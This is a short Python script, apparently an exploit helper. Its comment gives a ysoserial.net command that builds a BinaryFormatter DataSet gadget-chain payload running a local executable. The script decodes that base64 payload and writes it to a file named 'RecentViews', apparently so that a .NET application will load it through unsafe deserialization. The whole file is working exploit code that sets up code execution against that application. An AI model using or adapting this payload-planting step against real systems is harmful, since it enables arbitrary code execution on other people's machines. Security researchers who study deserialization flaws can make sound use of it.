import base64

#PS E:\ysoserial.net-1.34> .\ysoserial.exe -o base64 -f BinaryFormatter -g DataSet -c "forfiles /c C:\Users\test\Desktop\TESTdir\9999.exe" >b64.bin


with open ("b64.bin",'rb') as f:
	data = f.read()
	final = base64.b64decode(data)

with open("RecentViews",'wb') as f:
	f.write(final)